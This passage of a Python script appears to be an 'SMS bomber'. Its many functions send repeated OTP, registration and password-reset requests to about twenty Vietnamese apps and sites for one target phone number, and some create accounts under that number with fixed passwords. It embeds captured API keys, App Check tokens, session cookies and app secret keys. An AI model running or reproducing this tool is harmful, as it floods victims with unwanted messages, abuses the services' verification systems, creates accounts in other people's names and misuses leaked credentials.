        'x-firebase-appcheck': 'eyJraWQiOiJRNmZ5eEEiLCJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdWIiOiIxOjE2NTYxNzc3NjEyOmlvczpkMjRkODFiNzlmODY0ZWIzNGY4YjY5IiwiYXVkIjpbInByb2plY3RzXC8xNjU2MTc3NzYxMiIsInByb2plY3RzXC9kYWxhdC1iZHMiXSwicHJvdmlkZXIiOiJkZXZpY2VfY2hlY2tfYXBwX2F0dGVzdCIsImlzcyI6Imh0dHBzOlwvXC9maXJlYmFzZWFwcGNoZWNrLmdvb2dsZWFwaXMuY29tXC8xNjU2MTc3NzYxMiIsImV4cCI6MTczNjAwMDkwNywiaWF0IjoxNzM1OTk3MzA3LCJqdGkiOiIyMmpLTlhETlJEbEVHN2dQcUFLc2pwZy03V2toLU54M3pvMFZrXzdIcHJBIn0.hGOFfIogOZLZYQmb1v1SiUUoAgYh6iLp5glfR5uMtQQHVq2K-zhuJwxRtyxNfxsI89Mt3CXGU5m5ZiTc8m_VOVlJulyUTE5D0KP-y5ZsqycB7BJiH8IG7EGhS4uAOtvOHXCF-DFdPdvtR7pxMUHYkwIsxritRoLt7rTI8qCAhgTT4nEWRjjXvYmJo8B9dhF6_ExClj0Au9UioYnnhqYnDL8GTBzeO8entjmRlt9xbHTVbtTVcrFc0TWZj8xLnwTdnGkyDUxhvHRit2zE46mikcdw3I0gOJHqvF-uSw-7t66euJCKfYn0xeTMNU3Hg4vC1EiyN8Mhj_OdIYU6YAjpMG1w6XZ9RsIg2FNmiGeFZ4tRbiaw2hIeGHYLhMrq1GckOvrnA5PXoIg89W2lQ62Ye9P2xpGXEUc-CNqwt1n1o5Hu-fIetSG4qgNi1TgWbU7O8SPLS8Jw3fnLYezBcS2olhwu91HL65EkL7FUZwT5ldlDgBPvGjW2pdESH59y0FY1',
        'x-ios-bundle-identifier': 'com.dalatbds.ebroker',
        'accept-language': 'en',
        'user-agent': 'FirebaseAuth.iOS/10.15.0 com.dalatbds.ebroker/1.0.3 iPhone/17.4.1 hw/iPhone11_8',
        'x-firebase-gmpid': '1:16561777612:ios:d24d81b79f864eb34f8b69',
    }

    params = {
        'key': 'AIzaSyAoqJnJMlDHjlZuLPhvEVStfo4CvHax6t4',
    }

    json_data = {
        'iosReceipt': 'AEFDNu8BB_sx6nGU_12r9zfctn8oRGR-V4NtfLbaKq8cSlpNf-sxTq7ay1MGIKpVQ0HSdxN2zCLTdyQxWdBmnd79QA5iBwND6OFpe4uDdCLNZcQ2KojI71RNcnuZ_WkBsg',
        'iosSecret': 'S2e5YvF91lUom3pY',
        'phoneNumber': f'+84{sdt}',
    }

    try:
        response = requests.post(
            'https://www.googleapis.com/identitytoolkit/v3/relyingparty/sendVerificationCode',
            params=params,
            headers=headers,
            json=json_data,
        )
        response.raise_for_status()
        print("DALAT BDS | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("DALAT BDS | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def mocha2(): #ap check
    headers = {
        'Host': 'hlvip.mocha.com.vn:80',
        'uuid': '9A886A24-F17E-4576-8C00-B8206C0A1FA1',
        'Accept': '*/*',
        'countryCode': 'VN',
        'Accept-Language': 'vi-VN;q=1',
        'languageCode': 'vi',
        'User-Agent': 'mocha/6.00 (iPhone; iOS 17.4.1; Scale/2.00)',
        'gender': '0',
        'Content-Type': 'application/x-www-form-urlencoded',
    }

    data = {
        'clientType': 'ios',
        'countryCode': 'VN',
        'device': 'iPhone 14',
        'os_version': 'iOS_18',
        'platform': 'ios',
        'revision': '11731',
        'username': sdt,
        'version': '6.00',
    }

    try:
        response = requests.post('http://hlvip.mocha.com.vn:80/ReengBackendBiz/genotp/v33', headers=headers, data=data)
        response.raise_for_status()
        print("MOCHA2 | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("MOCHA | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def mocha35(): #ap check
    headers = {
        'Host': 'v2sslapimocha35.mocha.com.vn',
        'uuid': '9A886A24-F17E-4576-8C00-B8206C0A1FA1',
        'Accept': '*/*',
        'APPNAME': 'MC35',
        'countryCode': 'VN',
        'languageCode': 'vi',
        'Accept-Language': 'vi-VN;q=1',
        'User-Agent': 'mocha/1.31 (iPhone; iOS 17.4.1; Scale/2.00)',
        'Content-Type': 'application/x-www-form-urlencoded',
    }

    data = {
        'clientType': 'ios',
        'countryCode': 'VN',
        'device': 'iPhone11,8',
        'os_version': 'iOS_17.4.1',
        'platform': 'ios',
        'revision': '11235',
        'username': sdt,
        'version': '1.31',
    }

    try:
        response = requests.post('https://v2sslapimocha35.mocha.com.vn/ReengBackendBiz/genotp/v32', headers=headers, data=data)
        response.raise_for_status()
        print("MOCHA35 | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("MOCHA35 | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def jupviec(): #ap
    headers = {
        'Host': 'wondermaid.jupviec.vn',
        'Content-Type': 'application/json; charset=UTF-8',
        'Accept': 'application/json',
        'x-token': '2',
        'x-application-id': '1',
        'identification': '{"appVersion":"4.1.168","buildVersion":"1734778835","imei":"BA7E7009-6090-42D5-9921-BB8AFE72077F","platform":"ios","deviceId":"iPhone11%2C8","deviceName":"iPhone","manufacturer":"Apple","isEmulator":false,"appType":"CUSTOMER","language":"vi","timezone":7}',
        'Accept-Language': 'vi',
        'User-Agent': 'JupViec/1734778835 CFNetwork/1494.0.7 Darwin/23.4.0',
    }

    json_data = {
        'phone': sdt,
        'countryCode': '+84',
    }

    try:
        response = requests.post('https://wondermaid.jupviec.vn/api/account/send-otp', headers=headers, json=json_data)
        response.raise_for_status()
        print("JUPVIEC | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("JUPVIEC | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def guvi():
    headers = {
        'Host': 'server.guvico.com',
        'Content-Type': 'application/json',
        'User-Agent': 'Guvi/11 CFNetwork/1494.0.7 Darwin/23.4.0',
        'Accept': 'application/json, text/plain, */*',
        'version': '1.1.44',
        'Accept-Language': 'vi-VN,vi;q=0.9',
        'Authorization': 'Bearer null',
    }

    params = {
        'lang': 'vi',
    }

    json_data = {
        'code_phone_area': '+84',
        'phone': sdt,
    }

    try:
        response = requests.post('https://server.guvico.com/customer/auth/register_phone', params=params, headers=headers, json=json_data)
        response.raise_for_status()
        print("GUVI | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("GUVI | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def aio():
    cookies = {
        'mage-cache-storage': '{}',
        'mage-cache-storage-section-invalidation': '{}',
        'form_key': '2t5QRPIHEoET1XqG',
        'recently_viewed_product': '{}',
        'recently_viewed_product_previous': '{}',
        'recently_compared_product': '{}',
        'recently_compared_product_previous': '{}',
        'product_data_storage': '{}',
        'mage-messages': '',
        'form_key': '2t5QRPIHEoET1XqG',
        'PHPSESSID': 'bi4pnbrrv425ea5sd74nuusk58',
        'city_id': '1',
        'X-Magento-Vary': 'de9de66e57881beeebcb76e4db8a29ecd7a66c6f08b2640dae67162824fbd615',
        'district_id': '1',
        'seller_code_selected': '1',
        'mage-cache-sessid': 'true',
        'private_content_version': '33bf4549bd7b106f6f4c6475f8ecf7d9',
        'section_data_ids': '{%22compare-products%22:1735998838%2C%22cart%22:1735998838%2C%22messages%22:1735998932}',
    }

    headers = {
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'mage-cache-storage={}; mage-cache-storage-section-invalidation={}; form_key=2t5QRPIHEoET1XqG; recently_viewed_product={}; recently_viewed_product_previous={}; recently_compared_product={}; recently_compared_product_previous={}; product_data_storage={}; mage-messages=; form_key=2t5QRPIHEoET1XqG; PHPSESSID=bi4pnbrrv425ea5sd74nuusk58; city_id=1; X-Magento-Vary=de9de66e57881beeebcb76e4db8a29ecd7a66c6f08b2640dae67162824fbd615; district_id=1; seller_code_selected=1; mage-cache-sessid=true; private_content_version=33bf4549bd7b106f6f4c6475f8ecf7d9; section_data_ids={%22compare-products%22:1735998838%2C%22cart%22:1735998838%2C%22messages%22:1735998932}',
        'origin': 'https://aiosmart.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://aiosmart.com.vn/customer/account/login/',
        'sec-ch-ua': '"Chromium";v="130", "Opera";v="115", "Not?A_Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 OPR/115.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'login[otp]': '',
        'login[telephone]': sdt,
        'login[username]': 'Dat Gac',
        'confirm': 'on',
        'form_key': '2t5QRPIHEoET1XqG',
    }

    try:
        response = requests.post(
            'https://aiosmart.com.vn/advancedlogin/login/sendOtpRegister/',
            cookies=cookies,
            headers=headers,
            data=data,
        )
        response.raise_for_status()
        print("AIO | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("AIO | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def fpt(): #fptid longchau
    cookies = {
        '.AspNetCore.Antiforgery.GFaQlakWipg': 'CfDJ8NeBk3ntjPdOi7d2FDqzzZ6LY04lu9fL2mL1YkfLYiSPY1470_7eMBpNxBwWIF-V8EzAYTjw0iV2PgYTn_eZKb-yDdeWRMRGQzwilLTPJORrmpfNjIIyZXDp6iAH99RYHOgTxmD4YbAWQrpkVu-lX_8',
        'INGRESSCOOKIE': '1736000046.687.53.350621|7fba285e5548cf27d0d7a70b981762e8',
        'fptid-antiforgery': 'CfDJ8NeBk3ntjPdOi7d2FDqzzZ42TQu_trg0IT8zm9vPl-m7rHM2MutLy8khVyDPlbEeHt7oh54K4rSx17oBo7q1ZaVF348glqk09283mtOfVtnzXsaVRu7o1To3Wq691IDrvnDaL6CHoEMQ5ATsdG_cdMw',
        '.AspNetCore.Session': 'CfDJ8NeBk3ntjPdOi7d2FDqzzZ7Xzv7QE33HM08ZFxINxS%2BSnqtHjq%2FpTGV%2BOT%2B8VfXKoxuDN5SbGM2I9sv4%2FvkG3OU8c80Yyf7MnDM5owX9kZCuIC1CQw%2FU0H3mLlq7PDIjvFJuXMYjxE6a5NayOK41w19ME7iNGA4OjeN%2FyK3QdgEq',
        'fptid-session': 'CfDJ8NeBk3ntjPdOi7d2FDqzzZ5U%2FgyhTlJWBCzh8TIejjMhS5EcBK%2B8NOBUC9bxZI%2Ft5GqWUq%2Ft4D8aVjUV4wZpXrKw4IIKD%2F2UeMaodbeC9lYmAkns9uv4MC1dm1IAxc4q4m4x64jUPTBPP1HLWMYzV56u%2FU9HpMcoh23cwm6yZFzI',
        'oauth2_authentication_csrf_insecure': 'MTczNjAwMDA0NXxEdi1CQkFFQ180SUFBUkFCRUFBQVB2LUNBQUVHYzNSeWFXNW5EQVlBQkdOemNtWUdjM1J5YVc1bkRDSUFJR0V5WXpnMlptRmxOelUxWmpRM01qWmlNR015TldNMk9UTmhNVGxrWTJabHzZpWCCW00nPqqetX9JGOnfDPp2qgkZ7ObOtiMTnSwH5g==',
    }

    headers = {
        'Accept': '*/*',
        'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json',
        # 'Cookie': '.AspNetCore.Antiforgery.GFaQlakWipg=CfDJ8NeBk3ntjPdOi7d2FDqzzZ6LY04lu9fL2mL1YkfLYiSPY1470_7eMBpNxBwWIF-V8EzAYTjw0iV2PgYTn_eZKb-yDdeWRMRGQzwilLTPJORrmpfNjIIyZXDp6iAH99RYHOgTxmD4YbAWQrpkVu-lX_8; INGRESSCOOKIE=1736000046.687.53.350621|7fba285e5548cf27d0d7a70b981762e8; fptid-antiforgery=CfDJ8NeBk3ntjPdOi7d2FDqzzZ42TQu_trg0IT8zm9vPl-m7rHM2MutLy8khVyDPlbEeHt7oh54K4rSx17oBo7q1ZaVF348glqk09283mtOfVtnzXsaVRu7o1To3Wq691IDrvnDaL6CHoEMQ5ATsdG_cdMw; .AspNetCore.Session=CfDJ8NeBk3ntjPdOi7d2FDqzzZ7Xzv7QE33HM08ZFxINxS%2BSnqtHjq%2FpTGV%2BOT%2B8VfXKoxuDN5SbGM2I9sv4%2FvkG3OU8c80Yyf7MnDM5owX9kZCuIC1CQw%2FU0H3mLlq7PDIjvFJuXMYjxE6a5NayOK41w19ME7iNGA4OjeN%2FyK3QdgEq; fptid-session=CfDJ8NeBk3ntjPdOi7d2FDqzzZ5U%2FgyhTlJWBCzh8TIejjMhS5EcBK%2B8NOBUC9bxZI%2Ft5GqWUq%2Ft4D8aVjUV4wZpXrKw4IIKD%2F2UeMaodbeC9lYmAkns9uv4MC1dm1IAxc4q4m4x64jUPTBPP1HLWMYzV56u%2FU9HpMcoh23cwm6yZFzI; oauth2_authentication_csrf_insecure=MTczNjAwMDA0NXxEdi1CQkFFQ180SUFBUkFCRUFBQVB2LUNBQUVHYzNSeWFXNW5EQVlBQkdOemNtWUdjM1J5YVc1bkRDSUFJR0V5WXpnMlptRmxOelUxWmpRM01qWmlNR015TldNMk9UTmhNVGxrWTJabHzZpWCCW00nPqqetX9JGOnfDPp2qgkZ7ObOtiMTnSwH5g==',
        'Origin': 'https://accounts.fpt.vn',
        'Referer': 'https://accounts.fpt.vn/sso/Auth/Identifier?challenge=c80cc09c52624b1cb657c56dab58b5df',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 OPR/115.0.0.0',
        'X-CSRF-TOKEN': 'CfDJ8NeBk3ntjPdOi7d2FDqzzZ4zmAnjBXTetxuAdJ-mGohqqMxohUzIO6ZWrwGR8PMXpyFBhFjqVZ5JtGpF5MqNEpoYhjQP6iCLzAqkFPZDMHHptzd11xPhq0KoL3ddx1sbelFu2tj4UMhg-xCfNzgh1hE',
        'sec-ch-ua': '"Chromium";v="130", "Opera";v="115", "Not?A_Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'Username': sdt,
        'Challenge': 'c80cc09c52624b1cb657c56dab58b5df',
    }

    try:
        response = requests.post('https://accounts.fpt.vn/sso/partial/username', cookies=cookies, headers=headers, json=json_data)
        response.raise_for_status()
        print("FPT | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("FPT | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def unicar():
    headers = {
        'Host': 'api.unicar.vn',
        'accept': 'application/json, text/plain, */*',
        'content-type': 'application/json',
        'user-agent': 'unicar/9 CFNetwork/1494.0.7 Darwin/23.4.0',
        'accept-language': 'vi-VN,vi;q=0.9',
    }

    json_data = {
        'phoneNumber': sdt_chuyen_doi,
        'app': 'uni',
        'v': '34.10',
    }

    try:
        response = requests.post('https://api.unicar.vn/uauth/login_phone', headers=headers, json=json_data)
        response.raise_for_status()
        print("UNICAR | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("UNICAR | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def lozido(): #ap check
    headers = {
        'Host': 'quanlytro.me',
        'accept': 'application/json, text/plain, */*',
        'content-type': 'application/json',
        'user-agent': 'lozido_room_mobile/286 CFNetwork/1494.0.7 Darwin/23.4.0',
        'accept-language': 'vi-VN,vi;q=0.9',
    }

    params = {
        '_app_version': '1.9.9',
    }

    json_data = {
        'name': 'huy hub',
        'phone': sdt,
        'password': '123123aA@',
        'password_confirmation': '123123aA@',
    }

    response = requests.post('https://quanlytro.me/api/householder/v1/register', params=params, headers=headers, json=json_data)
    headers = {
        'Host': 'quanlytro.me',
        'accept': 'application/json, text/plain, */*',
        'content-type': 'application/json',
        'user-agent': 'lozido_room_mobile/286 CFNetwork/1494.0.7 Darwin/23.4.0',
        'accept-language': 'vi-VN,vi;q=0.9',
    }

    params = {
        '_app_version': '1.9.9',
    }

    json_data = {
        'phone': sdt,
    }

    try:
        response = requests.post('https://quanlytro.me/api/householder/v1/send-otp', params=params, headers=headers, json=json_data)
        response.raise_for_status()
        print(" | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print(" | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def moonvn():
    headers = {
        'Accept': 'application/json',
        'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'Access-Control-Allow-Headers': 'Access-Control-Allow-Origin, Accept',
        'Access-Control-Allow-Origin': '*',
        'Authorization': 'Bearer',
        'Connection': 'keep-alive',
        # 'Content-Length': '0',
        'Content-Type': 'application/json',
        'Origin': 'https://moon.vn',
        'Referer': 'https://moon.vn/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 OPR/115.0.0.0',
        'sec-ch-ua': '"Chromium";v="130", "Opera";v="115", "Not?A_Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    params = {
        'phoneNumber': sdt,
    }

    try:
        response = requests.post('https://identity.moon.vn/api/v2/user/register/regOTP', params=params, headers=headers)
        response.raise_for_status()
        print("MOON | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("MOON | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def pingpush(): #ap cleancall CHECK
    headers = {
        'Host': 'cleancall-api.pingpush.vn:8443',
        'device': '06490740-8F1E-426C-98DC-BDC244123A08',
        'content-type': 'application/json',
        'devicename': 'iPhone',
        'accept': 'Application/json',
        'user-agent': 'PPCallBlocker/3 CFNetwork/1494.0.7 Darwin/23.4.0',
        'accept-language': 'vi-VN,vi;q=0.9',
    }

    json_data = {
        'username': sdt,
    }

    response = requests.post('https://cleancall-api.pingpush.vn:8443/user/forget_password', headers=headers, json=json_data)
    headers = {
        'Host': 'cleancall-api.pingpush.vn:8443',
        'device': '06490740-8F1E-426C-98DC-BDC244123A08',
        'content-type': 'application/json',
        'devicename': 'iPhone',
        'accept': 'Application/json',
        'user-agent': 'PPCallBlocker/3 CFNetwork/1494.0.7 Darwin/23.4.0',
        'accept-language': 'vi-VN,vi;q=0.9',
    }

    json_data = {
        'phone_number': sdt,
        'password': '123123aA@',
    }

    try:
        response = requests.post('https://cleancall-api.pingpush.vn:8443/user/create', headers=headers, json=json_data)
        response.raise_for_status()
        print("PINGPUSH | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("PINGPUSH | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def ting(): #ap check
    headers = {
        'Host': 'api.ting.vn',
        'x-language': 'vi',
        'Content-Type': 'application/json',
        'User-Agent': 'TingUserApp/3 CFNetwork/1494.0.7 Darwin/23.4.0',
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi-VN,vi;q=0.9',
        'Authorization': 'Bearer null',
    }

    json_data = {
        'phone': sdt,
    }

    try:
        response = requests.post('https://api.ting.vn/users/request-otp-login', headers=headers, json=json_data)
        response.raise_for_status()
        print("TING | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("TING | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def kanow(): #ap
    headers = {
        'Host': 'system.kanow.vn',
        'accept': 'application/json',
        'content-type': 'application/json',
        'user-agent': 'Kanow/2 CFNetwork/1494.0.7 Darwin/23.4.0',
        'accept-language': 'vi-VN,vi;q=0.9',
    }

    json_data = {
        'phone': sdt,
        'event': 'register',
    }

    try:
        response = requests.post('https://system.kanow.vn/api/create_otp_sign_up', headers=headers, json=json_data)
        response.raise_for_status()
        print("KANOW | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("KANOW | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def butlsms(): #ap check
    headers = {
        'Host': 'app-khach-v2.butl.vn',
        'Content-Type': 'text/plain;charset=UTF-8',
        'Accept': '*/*',
        'User-Agent': 'BUTLUSER/1 CFNetwork/1494.0.7 Darwin/23.4.0',
        'Accept-Language': 'vi-VN,vi;q=0.9',
    }
    data = f'''{{
    "cmd": "doRegister",
    "data": {{
        "accessToken": "",
        "platform": 1,
        "deviceInfo": "iPhone XR",
        "token": "1",
        "countryCode": "84",
        "email": "1",
        "clientVersion": 1,
        "deviceID": "AD475342-6B7B-4C93-AFAB-CE68811AC06C",
        "name": "",
        "phone": "{sdt}",
        "password": "123456",
        "otp_method": "sms"
    }}
    }}'''

    try:
        response = requests.post('https://app-khach-v2.butl.vn/ButlAppServlet/user/services', headers=headers, data=data)
        response.raise_for_status()
        print("BUTLSMS | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("BUTLSMS | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def butlzl(): #ap ^^^ check
    headers = {
        'Host': 'app-khach-v2.butl.vn',
        'Content-Type': 'text/plain;charset=UTF-8',
        'Accept': '*/*',
        'User-Agent': 'BUTLUSER/1 CFNetwork/1494.0.7 Darwin/23.4.0',
        'Accept-Language': 'vi-VN,vi;q=0.9',
    }
    data = f'''{{
    "cmd": "doRegister",
    "data": {{
        "accessToken": "",
        "platform": 1,
        "deviceInfo": "iPhone XR",
        "token": "1",
        "countryCode": "84",
        "email": "1",
        "clientVersion": 1,
        "deviceID": "AD475342-6B7B-4C93-AFAB-CE68811AC06C",
        "name": "",
        "phone": "{sdt}",
        "password": "123456",
        "otp_method": "zalo"
    }}
    }}'''

    try:
        response = requests.post('https://app-khach-v2.butl.vn/ButlAppServlet/user/services', headers=headers, data=data)
        response.raise_for_status()
        print("BUTLZL | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("BUTLZL | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def ilokafood():
    headers = {
        'Host': 'back.iloka.vn:9999',
        'Content-Type': 'application/json',
        'Origin': 'capacitor://localhost',
        'Accept': 'application/json, text/plain, */*',
        'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148',
        'Accept-Language': 'vi-VN,vi;q=0.9',
    }

    json_data = {
        'phone': sdt,
    }

    try:
        response = requests.post('http://back.iloka.vn:9999/api/v2/customer/sentZaloOTP', headers=headers, json=json_data)
        response.raise_for_status()
        print("ILOKAFOOD | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("ILOKAFOOD | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def vieclam24h(): #ap
    headers = {
        'Host': 'api.mobile.vieclam24h.vn',
        'content-type': 'application/json',
        'accept': 'application/json, text/plain, */*',
        'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJjaGFubmVsX2NvZGUiOiJ2bDI0aCIsInVzZXIiOm51bGx9.a0POm2ZVRwetYs2QsMj0sRg8lZSSbKufX4sewqhAM5o',
        'app-version': '1.10.0',
        'app-name': 'VIECLAM24H-MOBILE-APP',
        'os': 'IOS',
        'accept-language': 'vi-VN,vi;q=0.9',
        'x-api-version': '1.0',
        'user-agent': 'Vieclam24h/1 CFNetwork/1494.0.7 Darwin/23.4.0',
        'lang': 'vi',
        'os-version': '17.4.1',
    }

    json_data = {
        'type': 1,
        'mobile': sdt,
    }

    try:
        response = requests.post('https://api.mobile.vieclam24h.vn/seeker/request-otp', headers=headers, json=json_data)
        response.raise_for_status()
        print("VIECLAM24H | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("VIECLAM24H | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def sobanhangzl(): #ap
    headers = {
        'Host': 'api.sobanhang.com',
        'content-type': 'application/json',
        'accept': 'application/json',
        'x-location-timezone': 'UTC+07:00',
        'x-current-version': '3.1.3',
        'accept-language': 'vi-VN,vi;q=0.9',
        'user-agent': 'finan/2 CFNetwork/1494.0.7 Darwin/23.4.0',
        'x-current-screen': 'PasswordHandlerScreen',
        'x-locale-code': 'vi_VN',
    }

    json_data = {
        'phone_number': sdt,
        'pwd': None,
        'platform': 'gtapp',
        'device_id': '796B9301-42DF-4340-BFDF-D415E8E0F5C7',
        'action': 'create_account',
        'email': 'boyssss5@gmail.com',
        'receiving_method': 'phone_number',
        'is_send_zns': True,
        'secret_key': 'df753c9cb291dfd4789cc95834211ac34c509a90fb80c2c8a8430acb3cdda8ab3d8a9176b98fb10ac04a2c47f6b5c72fd4386a',
    }

    try:
        response = requests.post('https://api.sobanhang.com/finan-user/api/v2/auth/account/request', headers=headers, json=json_data)
        response.raise_for_status()
        print("SOBANHANGZL | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("SOBANHANGZL | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def sobanhang(): #ap ^
    headers = {
        'Host': 'api.sobanhang.com',
        'content-type': 'application/json',
        'accept': 'application/json',
        'x-location-timezone': 'UTC+07:00',
        'x-current-version': '3.1.3',
        'accept-language': 'vi-VN,vi;q=0.9',
        'user-agent': 'finan/2 CFNetwork/1494.0.7 Darwin/23.4.0',
        'x-current-screen': 'VerifyOTPScreen',
        'x-locale-code': 'vi_VN',
    }

    json_data = {
        'phone_number': sdt,
        'action': 'create_account',
        'platform': 'gtapp',
        'device_id': '796B9301-42DF-4340-BFDF-D415E8E0F5C7',
        'receiving_method': 'phone_number',
        'is_send_zns': False,
        'secret_key': '1b30cd4319584f071d51f40e4528f03992be48da3538a09cc0c9aee4655c331acd941dc0e169c3d82eade9f3f52cc86cafb535',
    }

    try:
        response = requests.post('https://api.sobanhang.com/finan-user/api/v2/auth/account/request', headers=headers, json=json_data)
        response.raise_for_status()
        print("SOBANHANG | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("SOBANHANG | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def sfin(): #ap \sshop\ CHECK
    headers = {
        'Host': 'proapi.sspa.com.vn',
        'Content-Type': 'application/json',
        'User-Agent': 'sshop/4 CFNetwork/1494.0.7 Darwin/23.4.0',
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi-VN,vi;q=0.9',
        'appid': 'SSHOP',
        'appversion': '1.248',
    }

    json_data = {
        'username': f'84{sdt[1:10]}',
        'type': 'REGISTRATION',
        'appId': 'SSHOP',
        'languageCode': 'vi',
    }

    try:
        response = requests.post('https://proapi.sspa.com.vn/auth/v2/otp/generate-v2', headers=headers, json=json_data)
        response.raise_for_status()
        print("SFIN | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("SFIN | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def sapo(): #ap
    cookies = {
        '_ce.s': 'v~49080a70832696e187ca7fecd56e47732d086b79~lcw~1737281377270~vir~new~lva~1737281358226~vpv~0~v11.fhb~1737281358870~v11.lhb~1737281358870~v11.cs~200798~v11.s~7235a980-d64d-11ef-b9eb-6fd44cdb52b3~v11.sla~1737281377273~lcw~1737281377274',
        '_gcl_au': '1.1.469866645.1737281357.833280956.1737281366.1737281366',
        '_ga_8Z6MB85ZM2': 'GS1.1.1737281358.1.0.1737281362.56.0.0',
        '_ga_P9DPF3E00F': 'GS1.1.1737281357.1.0.1737281361.56.0.1419720187',
        '_fbp': 'fb.1.1737281358518.413443319714398426',
        '_ga': 'GA1.1.1455940863.1737281357',
        '_ga_HXMGB9WRVX': 'GS1.1.1737281359.1.0.1737281359.60.0.0',
        '_ce.clock_data': '78%2C171.224.177.243%2C2%2Ced14c804f644b5b0aaa13f3f8ddb4a1f%2CMobile%20Safari%2CVN',
        '_ga_EBZKH8C7MK': 'GS1.2.1737281358.1.0.1737281358.0.0.0',
        '_ga_Y9YZPDEGP0': 'GS1.1.1737281358.1.0.1737281358.60.0.0',
        '_ga_YNVPPJ8MZP': 'GS1.1.1737281357.1.0.1737281358.59.0.0',
        '_pk_id.564990941.8ae7': '0.1737281358.1.1737281358.1737281358.',
        '_pk_ses.564990941.8ae7': '*',
        'cebs': '1',
        'cebsp_': '1',
        '_ga_8956TVT2M3': 'GS1.1.1737281357.1.0.1737281357.60.0.0',
        '_ga_CDD1S5P7D4': 'GS1.1.1737281357.1.0.1737281357.60.0.0',
